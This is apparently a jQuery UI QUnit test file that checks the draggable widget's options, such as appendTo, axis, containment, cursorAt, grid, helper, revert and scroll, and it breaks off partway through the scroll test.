(function( $ ) {

module( "draggable: options" );

// TODO: This doesn't actually test whether append happened, possibly remove
test( "{ appendTo: 'parent' }, default, no clone", function() {
	expect( 2 );
	var element = $( "#draggable2" ).draggable({ appendTo: "parent" });
	TestHelpers.draggable.shouldMove( element );

	element = $( "#draggable1" ).draggable({ appendTo: "parent" });
	TestHelpers.draggable.shouldMove( element );
});

// TODO: This doesn't actually test whether append happened, possibly remove
test( "{ appendTo: Element }, no clone", function() {
	expect( 2 );
	var element = $( "#draggable2" ).draggable({ appendTo: $( "#draggable2" ).parent()[ 0 ] });

	TestHelpers.draggable.shouldMove( element );

	element = $( "#draggable1" ).draggable({ appendTo: $( "#draggable2" ).parent()[ 0 ] });
	TestHelpers.draggable.shouldMove( element );
});

// TODO: This doesn't actually test whether append happened, possibly remove
test( "{ appendTo: Selector }, no clone", function() {
	expect( 2 );
	var element = $( "#draggable2" ).draggable({ appendTo: "#main" });
	TestHelpers.draggable.shouldMove( element );

	element = $( "#draggable1" ).draggable({ appendTo: "#main" });
	TestHelpers.draggable.shouldMove( element );
});

test( "{ appendTo: 'parent' }, default", function() {
	expect( 2 );

	var element = $( "#draggable1" ).draggable();

	TestHelpers.draggable.trackAppendedParent( element );

	equal( element.draggable( "option", "appendTo" ), "parent" );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_parent" ), $( "#qunit-fixture" )[ 0 ] );
});

test( "{ appendTo: Element }", function() {
	expect( 1 );

	var appendTo = $( "#draggable2" ).parent()[ 0 ],
		element = $( "#draggable1" ).draggable({ appendTo: appendTo });

	TestHelpers.draggable.trackAppendedParent( element );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_parent" ), appendTo );
});

test( "{ appendTo: jQuery }", function() {
	expect( 1 );

	var appendTo = $( "#draggable2" ).parent(),
		element = $( "#draggable1" ).draggable({ appendTo: appendTo });

	TestHelpers.draggable.trackAppendedParent( element );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_parent" ), appendTo[ 0 ] );
});

test( "{ appendTo: Selector }", function() {
	expect( 1 );

	var appendTo = "#main",
		element = $( "#draggable1" ).draggable({ appendTo: appendTo });

	TestHelpers.draggable.trackAppendedParent( element );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_parent" ), $(appendTo)[ 0 ] );
});

test( "appendTo, default, switching after initialization", function() {
	expect( 2 );

	var element = $( "#draggable1" ).draggable({ helper : "clone" });

	TestHelpers.draggable.trackAppendedParent( element );

	// Move and make sure element was appended to fixture
	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_parent" ), $( "#qunit-fixture" )[ 0 ] );

	// Move and make sure element was appended to main
	element.draggable( "option", "appendTo", $( "#main" ) );
	TestHelpers.draggable.move( element, 2, 2 );
	equal( element.data( "last_dragged_parent" ), $( "#main" )[ 0 ] );
});

test( "{ axis: false }, default", function() {
	expect( 1 );
	var element = $( "#draggable2" ).draggable({ axis: false });
	TestHelpers.draggable.shouldMove( element );
});

test( "{ axis: 'x' }", function() {
	expect( 1 );
	var element = $( "#draggable2" ).draggable({ axis: "x" });
	TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 0 );
});

test( "{ axis: 'y' }", function() {
	expect( 1 );
	var element = $( "#draggable2" ).draggable({ axis: "y" });
	TestHelpers.draggable.testDrag( element, element, 50, 50, 0, 50 );
});

test( "{ axis: ? }, unexpected", function() {
	var element,
		unexpected = {
			"true": true,
			"{}": {},
			"[]": [],
			"null": null,
			"undefined": undefined,
			"function() {}": function() {}
		};

	expect( 6 );

	$.each(unexpected, function(key, val) {
		element = $( "#draggable2" ).draggable({ axis: val });
		TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 50, "axis: " + key );
		element.draggable( "destroy" );
	});
});

test( "axis, default, switching after initialization", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable({ axis : false });

	// Any Direction
	TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 50 );

	// Only horizontal
	element.draggable( "option", "axis", "x" );
	TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 0 );

	// Vertical only
	element.draggable( "option", "axis", "y" );
	TestHelpers.draggable.testDrag( element, element, 50, 50, 0, 50 );

});

test( "{ cancel: 'input,textarea,button,select,option' }, default", function() {
	expect( 2 );

	$( "<div id='draggable-option-cancel-default'><input type='text'></div>" ).appendTo( "#main" );

	var element = $( "#draggable-option-cancel-default" ).draggable({ cancel: "input,textarea,button,select,option" });
	TestHelpers.draggable.shouldMove( element );

	element.draggable( "destroy" );

	element = $( "#draggable-option-cancel-default" ).draggable({ cancel: "input,textarea,button,select,option" });
	TestHelpers.draggable.testDrag( element, "#draggable-option-cancel-default input", 50, 50, 0, 0 );
	element.draggable( "destroy" );
});

test( "{ cancel: 'span' }", function() {
	expect( 2 );

	var element = $( "#draggable2" ).draggable();
	TestHelpers.draggable.testDrag( element, "#draggable2 span", 50, 50, 50, 50 );

	element.draggable( "destroy" );

	element = $( "#draggable2" ).draggable({ cancel: "span" });
	TestHelpers.draggable.testDrag( element, "#draggable2 span", 50, 50, 0, 0 );
});

test( "{ cancel: ? }, unexpected", function() {
	expect( 6 );

	var element,
		unexpected = {
			"true": true,
			"false": false,
			"{}": {},
			"[]": [],
			"null": null,
			"undefined": undefined
		};

	$.each( unexpected, function( key, val ) {
		element = $( "#draggable2" ).draggable({ cancel: val });
		TestHelpers.draggable.shouldMove( element, "cancel: " + key );
		element.draggable( "destroy" );
	});
});

/**
test( "{ cancel: Selectors }, matching parent selector", function() {

	expect( 5 );

	var element = $( "#draggable2" ).draggable({ cancel: "span a" });

	$( "#qunit-fixture" ).append( "<span id='wrapping'><a></a></span>" );

	element.find( "span" ).append( "<a>" );

	$( "#wrapping a" ).append( element );

	TestHelpers.draggable.testDrag( element, "#draggable2 span", 50, 50, 50, 50, "drag span child" );
	TestHelpers.draggable.shouldNotMove( $( "#draggable2 span a" ) );
	TestHelpers.draggable.shouldNotMove( $( "#wrapping a" ) );

	$( "#draggable2" ).draggable( "option", "cancel", "span > a" );
	$( "#draggable2" ).find( "a" ).append( "<a>" );


	TestHelpers.draggable.testDrag( element, $( "#draggable2 span a" ).last(), 50, 50, 50, 50, "drag span child" );
	TestHelpers.draggable.shouldNotMove( $( "#draggable2 span a" ).first() );

});
*/

test( "cancelement, default, switching after initialization", function() {
	expect( 3 );

	$( "<div id='draggable-option-cancel-default'><input type='text'></div>" ).appendTo( "#main" );

	var input = $( "#draggable-option-cancel-default input" ),
		element = $( "#draggable-option-cancel-default" ).draggable();

	TestHelpers.draggable.testDrag( element, input, 50, 50, 0, 0 );

	element.draggable( "option", "cancel", "textarea" );
	TestHelpers.draggable.testDrag( element, input, 50, 50, 50, 50 );

	element.draggable( "option", "cancel", "input" );
	TestHelpers.draggable.testDrag( element, input, 50, 50, 0, 0 );
});

/*

test( "{ connectToSortable: selector }, default", function() {
	expect( 1 );

	ok(false, "missing test - untested code is broken code" );
});
*/

test( "{ containment: Element }", function() {
	expect( 1 );

	var offsetAfter,
		element = $( "#draggable1" ).draggable({ containment: $( "#draggable1" ).parent()[ 0 ] }),
		p = element.parent(),
		po = p.offset(),
		expected = {
			left: po.left + TestHelpers.draggable.border( p, "left" ) + TestHelpers.draggable.margin( element, "left" ),
			top: po.top + TestHelpers.draggable.border( p, "top" ) + TestHelpers.draggable.margin( element, "top" )
		};

	element.simulate( "drag", {
		dx: -100,
		dy: -100
	});
	offsetAfter = element.offset();
	deepEqual( offsetAfter, expected, "compare offset to parent" );
});

test( "{ containment: Selector }", function() {
	expect( 1 );

	var offsetAfter,
		element = $( "#draggable1" ).draggable({ containment: $( "#qunit-fixture" ) }),
		p = element.parent(),
		po = p.offset(),
		expected = {
			left: po.left + TestHelpers.draggable.border( p, "left" ) + TestHelpers.draggable.margin( element, "left" ),
			top: po.top + TestHelpers.draggable.border( p, "top" ) + TestHelpers.draggable.margin( element, "top" )
		};

	element.simulate( "drag", {
		dx: -100,
		dy: -100
	});
	offsetAfter = element.offset();
	deepEqual( offsetAfter, expected, "compare offset to parent" );
});

test( "{ containment: [x1, y1, x2, y2] }", function() {
	expect( 1 );

	var element = $( "#draggable1" ).draggable(),
		eo = element.offset();

	element.draggable( "option", "containment", [ eo.left, eo.top, eo.left + element.width() + 5, eo.top + element.height() + 5 ] );

	TestHelpers.draggable.testDrag( element, element, -100, -100, 0, 0 );
});

test( "{ containment: 'parent' }, relative", function() {
	expect( 1 );

	var offsetAfter,
		element = $( "#draggable1" ).draggable({ containment: "parent" }),
		p = element.parent(),
		po = p.offset(),
		expected = {
			left: po.left + TestHelpers.draggable.border( p, "left" ) + TestHelpers.draggable.margin( element, "left" ),
			top: po.top + TestHelpers.draggable.border( p, "top" ) + TestHelpers.draggable.margin( element, "top" )
		};

	element.simulate( "drag", {
		dx: -100,
		dy: -100
	});
	offsetAfter = element.offset();
	deepEqual( offsetAfter, expected, "compare offset to parent" );
});

test( "{ containment: 'parent' }, absolute", function() {
	expect( 1 );

	var offsetAfter,
		element = $( "#draggable2" ).draggable({ containment: "parent" }),
		p = element.parent(),
		po = p.offset(),
		expected = {
			left: po.left + TestHelpers.draggable.border( p, "left" ) + TestHelpers.draggable.margin( element, "left" ),
			top: po.top + TestHelpers.draggable.border( p, "top" ) + TestHelpers.draggable.margin( element, "top" )
		};

	element.simulate( "drag", {
		dx: -100,
		dy: -100
	});
	offsetAfter = element.offset();
	deepEqual( offsetAfter, expected, "compare offset to parent" );
});

test( "containment, account for border", function() {
	expect( 2 );

	var el = $("#draggable1").appendTo("#main"),
		parent = el.parent().css({
			height: "100px",
			width: "100px",
			borderStyle: "solid",
			borderWidth: "5px 10px 15px 20px"
		}),
		parentBottom = parent.offset().top + parent.outerHeight(),
		parentRight = parent.offset().left + parent.outerWidth(),
		parentBorderBottom = TestHelpers.draggable.border( parent, "bottom" ),
		parentBorderRight = TestHelpers.draggable.border( parent, "right" );

	el.css({
		height: "5px",
		width: "5px"
	}).draggable({ containment: "parent" });

	el.simulate( "drag", {
		dx: 100,
		dy: 100
	});

	equal( el.offset().top, parentBottom - parentBorderBottom - el.height(),
		"The draggable should be on top of its parent's bottom border" );
	equal( el.offset().left, parentRight - parentBorderRight - el.width(),
		"The draggable should be to the right of its parent's right border" );
});

test( "containment, default, switching after initialization", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable({ containment: false });

	TestHelpers.draggable.testDrag( element, element, -100, -100, -100, -100 );

	element.draggable( "option", "containment", "parent" )
		.css({
			top: 0,
			left: 0
		})
		.appendTo( $( "#main" ) );

	TestHelpers.draggable.testDrag( element, element, -100, -100, 0, 0 );

	element.draggable( "option", "containment", false );
	TestHelpers.draggable.testDrag( element, element, -100, -100, -100, -100 );
});

test( "{ cursor: 'auto' }, default", function() {
	function getCursor() {
		return $( "#draggable2" ).css( "cursor" );
	}

	expect( 2 );

	var actual, after,
		expected = "auto",
		element = $( "#draggable2" ).draggable({
			cursor: expected,
			start: function() {
				actual = getCursor();
			}
		}),
		before = getCursor();

	element.simulate( "drag", {
		dx: -1,
		dy: -1
	});
	after = getCursor();

	equal( actual, expected, "start callback: cursor '" + expected + "'" );
	equal( after, before, "after drag: cursor restored" );
});

test( "{ cursor: 'move' }", function() {
	function getCursor() {
		return $( "body" ).css( "cursor" );
	}

	expect( 2 );

	var actual, after,
		expected = "move",
		element = $( "#draggable2" ).draggable({
			cursor: expected,
			start: function() {
				actual = getCursor();
			}
		}),
		before = getCursor();

	element.simulate( "drag", {
		dx: -1,
		dy: -1
	});
	after = getCursor();

	equal( actual, expected, "start callback: cursor '" + expected + "'" );
	equal( after, before, "after drag: cursor restored" );
});

test( "cursor, default, switching after initialization", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable();

	TestHelpers.draggable.trackMouseCss( element );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_cursor" ), "auto" );

	element.draggable( "option", "cursor", "move" );
	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_cursor" ), "move" );

	element.draggable( "option", "cursor", "ns-resize" );
	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.data( "last_dragged_cursor" ), "ns-resize" );
});

test( "cursorAt", function() {
	expect( 24 );

	var deltaX = -3,
		deltaY = -3,
		tests = {
			"false": { cursorAt : false },
			"{ left: -5, top: -5 }": { x: -5, y: -5, cursorAt : { left: -5, top: -5 } },
			"[ 10, 20 ]": { x: 10, y: 20, cursorAt : [ 10, 20 ] },
			"'10 20'": { x: 10, y: 20, cursorAt : "10 20" },
			"{ left: 20, top: 40 }": { x: 20, y: 40, cursorAt : { left: 20, top: 40 } },
			"{ right: 10, bottom: 20 }": { x: 10, y: 20, cursorAt : { right: 10, bottom: 20 } }
		};

	$.each( tests, function( testName, testData ) {
		$.each( [ "relative", "absolute" ], function( i, position ) {
			var element = $( "#draggable" + ( i + 1 ) ).draggable({
					cursorAt: testData.cursorAt,
					drag: function( event, ui ) {
						if( !testData.cursorAt ) {
							equal( ui.position.left - ui.originalPosition.left, deltaX, testName + " " + position + " left" );
							equal( ui.position.top - ui.originalPosition.top, deltaY, testName + " " + position + " top" );
						} else if( testData.cursorAt.right ) {
							equal( ui.helper.width() - ( event.clientX - ui.offset.left ), testData.x - TestHelpers.draggable.unreliableOffset, testName + " " + position + " left" );
							equal( ui.helper.height() - ( event.clientY - ui.offset.top ), testData.y - TestHelpers.draggable.unreliableOffset, testName + " " +position + " top" );
						} else {
							equal( event.clientX - ui.offset.left, testData.x + TestHelpers.draggable.unreliableOffset, testName + " " + position + " left" );
							equal( event.clientY - ui.offset.top, testData.y + TestHelpers.draggable.unreliableOffset, testName + " " + position + " top" );
						}
					}
			});

			element.simulate( "drag", {
				moves: 1,
				dx: deltaX,
				dy: deltaY
			});
		});
	});
});

test( "cursorAt, switching after initialization", function() {
	expect( 24 );

	var deltaX = -3,
		deltaY = -3,
		tests = {
			"false": { cursorAt : false },
			"{ left: -5, top: -5 }": { x: -5, y: -5, cursorAt : { left: -5, top: -5 } },
			"[ 10, 20 ]": { x: 10, y: 20, cursorAt : [ 10, 20 ] },
			"'10 20'": { x: 10, y: 20, cursorAt : "10 20" },
			"{ left: 20, top: 40 }": { x: 20, y: 40, cursorAt : { left: 20, top: 40 } },
			"{ right: 10, bottom: 20 }": { x: 10, y: 20, cursorAt : { right: 10, bottom: 20 } }
		};

	$.each( tests, function( testName, testData ) {
		$.each( [ "relative", "absolute" ], function( i, position ) {
			var element = $( "#draggable" + ( i + 1 ) );

			element.draggable({
					drag: function( event, ui ) {
						if( !testData.cursorAt ) {
							equal( ui.position.left - ui.originalPosition.left, deltaX, testName + " " + position + " left" );
							equal( ui.position.top - ui.originalPosition.top, deltaY, testName + " " + position + " top" );
						} else if( testData.cursorAt.right ) {
							equal( ui.helper.width() - ( event.clientX - ui.offset.left ), testData.x - TestHelpers.draggable.unreliableOffset, testName + " " + position + " left" );
							equal( ui.helper.height() - ( event.clientY - ui.offset.top ), testData.y - TestHelpers.draggable.unreliableOffset, testName + " " +position + " top" );
						} else {
							equal( event.clientX - ui.offset.left, testData.x + TestHelpers.draggable.unreliableOffset, testName + " " + position + " left" );
							equal( event.clientY - ui.offset.top, testData.y + TestHelpers.draggable.unreliableOffset, testName + " " + position + " top" );
						}
					}
			});

			element.draggable( "option", "cursorAt", false );
			element.draggable( "option", "cursorAt", testData.cursorAt );

			element.simulate( "drag", {
				moves: 1,
				dx: deltaX,
				dy: deltaY
			});
		});
	});
});

test( "disabled", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable();

	TestHelpers.draggable.shouldMove( element );

	element.draggable( "option", "disabled", true );
	TestHelpers.draggable.shouldNotMove( element );

	element.draggable( "option", "disabled", false );
	TestHelpers.draggable.shouldMove( element );
});

test( "{ grid: [50, 50] }, relative", function() {
	expect( 2 );

	var element = $( "#draggable1" ).draggable({ grid: [ 50, 50 ] });
	TestHelpers.draggable.testDrag( element, element, 24, 24, 0, 0 );
	TestHelpers.draggable.testDrag( element, element, 26, 25, 50, 50 );
});

test( "{ grid: [50, 50] }, absolute", function() {
	expect( 2 );

	var element = $( "#draggable2" ).draggable({ grid: [ 50, 50 ] });
	TestHelpers.draggable.testDrag( element, element, 24, 24, 0, 0 );
	TestHelpers.draggable.testDrag( element, element, 26, 25, 50, 50 );
});

test( "grid, switching after initialization", function() {
	expect( 4 );

	var element = $( "#draggable1" ).draggable();

	// Forward
	TestHelpers.draggable.testDrag( element, element, 24, 24, 24, 24 );
	TestHelpers.draggable.testDrag( element, element, 0, 0, 0, 0 );

	element.draggable( "option", "grid", [ 50,50 ] );

	TestHelpers.draggable.testDrag( element, element, 24, 24, 0, 0 );
	TestHelpers.draggable.testDrag( element, element, 26, 25, 50, 50 );
});

test( "{ handle: 'span' }", function() {
	expect( 3 );

	var element = $( "#draggable2" ).draggable({ handle: "span" });

	TestHelpers.draggable.testDrag( element, "#draggable2 span", 50, 50, 50, 50, "drag span" );
	TestHelpers.draggable.testDrag( element, "#draggable2 span em", 50, 50, 50, 50, "drag span child" );
	TestHelpers.draggable.shouldNotMove( element, "drag element" );
});

test( "handle, default, switching after initialization", function() {
	expect( 6 );

	var element = $( "#draggable2" ).draggable();

	TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 50 );
	TestHelpers.draggable.testDrag( element, "#draggable2 span", 100, 100, 100, 100 );

	// Switch
	element.draggable( "option", "handle", "span" );
	TestHelpers.draggable.testDrag( element, element, 50, 50, 0, 0 );
	TestHelpers.draggable.testDrag( element, "#draggable2 span", 100, 100, 100, 100 );

	// And back
	element.draggable( "option", "handle", false );
	TestHelpers.draggable.testDrag( element, element, 50, 50, 50, 50 );
	TestHelpers.draggable.testDrag( element, "#draggable2 span", 100, 100, 100, 100 );
});

test( "helper, default, switching after initialization", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable();
	TestHelpers.draggable.shouldMove( element );

	element.draggable( "option", "helper", "clone" );
	TestHelpers.draggable.shouldNotMove( element );

	element.draggable( "option", "helper", "original" );
	TestHelpers.draggable.shouldMove( element );
});

test( "{ helper: 'clone' }, relative", function() {
	expect( 1 );

	var element = $( "#draggable1" ).draggable({ helper: "clone" });
	TestHelpers.draggable.shouldNotMove( element );
});

test( "{ helper: 'clone' }, absolute", function() {
	expect( 1 );

	var element = $( "#draggable2" ).draggable({ helper: "clone" });
	TestHelpers.draggable.shouldNotMove( element );
});

test( "{ helper: 'original' }, relative, with scroll offset on parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
});

test( "{ helper: 'original' }, relative, with scroll offset on root", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'original' }, relative, with scroll offset on root and parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'original' }, absolute, with scroll offset on parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "absolute", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
});

test( "{ helper: 'original' }, absolute, with scroll offset on root", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "absolute", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'original' }, absolute, with scroll offset on root and parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "absolute", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'original' }, fixed, with scroll offset on parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "fixed", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
});

test( "{ helper: 'original' }, fixed, with scroll offset on root", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "fixed", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'original' }, fixed, with scroll offset on root and parent", function() {
	expect( 3 );

	var element = $( "#draggable1" ).css({ position: "fixed", top: 0, left: 0 }).draggable({ helper: "original" });

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "relative" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "static" );

	TestHelpers.draggable.setScroll();
	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.testScroll( element, "absolute" );

	TestHelpers.draggable.restoreScroll();
	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'clone' }, absolute", function() {
	expect( 1 );

	var helperOffset = null,
		origOffset = $( "#draggable1" ).offset(),
		element = $( "#draggable1" ).draggable({ helper: "clone", drag: function( event, ui) {
			helperOffset = ui.helper.offset();
		} });

	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );
});

test( "{ helper: 'clone' }, absolute with scroll offset on parent", function() {
	expect( 3 );

	TestHelpers.draggable.setScroll();
	var helperOffset = null,
		origOffset = null,
		element = $( "#draggable1" ).draggable({
			helper: "clone",
			drag: function( event, ui) {
				helperOffset = ui.helper.offset();
			}
		});

	$( "#main" ).css( "position", "relative" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "static" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "absolute" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	TestHelpers.draggable.restoreScroll();
});

test( "{ helper: 'clone' }, absolute with scroll offset on root", function() {
	expect( 3 );

	TestHelpers.draggable.setScroll( "root" );
	var helperOffset = null,
		origOffset = null,
		element = $( "#draggable1" ).draggable({
			helper: "clone",
			drag: function( event, ui) {
				helperOffset = ui.helper.offset();
			}
		});

	$( "#main" ).css( "position", "relative" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "static" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "absolute" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	TestHelpers.draggable.restoreScroll( "root" );
});

test( "{ helper: 'clone' }, absolute with scroll offset on root and parent", function() {
	expect( 3 );

	TestHelpers.draggable.setScroll( "root" );
	TestHelpers.draggable.setScroll();

	var helperOffset = null,
		origOffset = null,
		element = $( "#draggable1" ).draggable({
			helper: "clone",
			drag: function( event, ui) {
				helperOffset = ui.helper.offset();
			}
		});

	$( "#main" ).css( "position", "relative" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "static" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	$( "#main" ).css( "position", "absolute" );
	origOffset = $( "#draggable1" ).offset();
	element.simulate( "drag", {
		dx: 1,
		dy: 1
	});
	deepEqual({ top: helperOffset.top - 1, left: helperOffset.left - 1 }, origOffset, "dragged[1, 1]" );

	TestHelpers.draggable.restoreScroll( "root" );
	TestHelpers.draggable.restoreScroll();
});

test( "{ opacity: 0.5 }", function() {
	expect( 1 );

	var opacity = null,
		element = $( "#draggable2" ).draggable({
			opacity: 0.5,
			start: function() {
				opacity = $(this).css( "opacity" );
			}
		});

	element.simulate( "drag", {
		dx: -1,
		dy: -1
	});

	equal( opacity, 0.5, "start callback: opacity is" );
});

test( "opacity, default, switching after initialization", function() {
	expect( 3 );

	var opacity = null,
		element = $( "#draggable2" ).draggable({
			start: function() {
				opacity = $(this).css( "opacity" );
			}
		});

	TestHelpers.draggable.move( element, 1, 1 );
	equal( opacity, 1 );

	element.draggable( "option", "opacity", 0.5 );
	TestHelpers.draggable.move( element, 2, 1 );
	equal( opacity, 0.5 );

	element.draggable( "option", "opacity", false );
	TestHelpers.draggable.move( element, 3, 1 );
	equal( opacity, 1 );
});

asyncTest( "revert and revertDuration", function() {
	expect( 4 );

	var element = $( "#draggable2" ).draggable({
		revert: true,
		revertDuration: 0
	});
	TestHelpers.draggable.shouldNotMove( element, "revert: true, revertDuration: 0 should revert immediately" );

	$( "#draggable2" ).draggable( "option", "revert", "invalid" );
	TestHelpers.draggable.shouldNotMove( element, "revert: invalid, revertDuration: 0 should revert immediately" );

	$( "#draggable2" ).draggable( "option", "revert", false );
	TestHelpers.draggable.shouldMove( element, "revert: false should allow movement" );

	$( "#draggable2" ).draggable( "option", {
		revert: true,
		revertDuration: 200,
		stop: function() {
			start();
		}
	});

	// animation are async, so test for it asynchronously
	TestHelpers.draggable.move( element, 50, 50 );
	setTimeout( function() {
		ok( $( "#draggable2" ).is( ":animated" ), "revert: true with revertDuration should animate" );
	});
});

test( "revert: valid", function() {
	expect( 1 );

	var element = $( "#draggable2" ).draggable({
			revert: "valid",
			revertDuration: 0
		});

	$( "#droppable" ).droppable();

	TestHelpers.draggable.testDrag( element, element, 100, 100, 0, 0, "revert: valid reverts when dropped on a droppable" );
});

test( "scope", function() {
	expect( 2 );

	var element = $( "#draggable2" ).draggable({
		scope: "tasks",
		revert: "valid",
		revertDuration: 0
	});

	$( "#droppable" ).droppable({ scope: "tasks" });

	TestHelpers.draggable.testDrag( element, element, 100, 100, 0, 0, "revert: valid reverts when dropped on a droppable in scope" );

	$( "#droppable" ).droppable( "destroy" ).droppable({ scope: "nottasks" });

	TestHelpers.draggable.testDrag( element, element, 100, 100, 100, 100, "revert: valid reverts when dropped on a droppable out of scope" );
});

test( "scroll, scrollSensitivity, and scrollSpeed", function() {
	expect( 2 );

	var viewportHeight = $( window ).height(),
		element = $( "#draggable1" ).draggable({ scroll: true }),
		scrollSensitivity = element.draggable( "option", "scrollSensitivity" ),
		scrollSpeed = element.draggable( "option", "scrollSpeed" );

	element.offset({
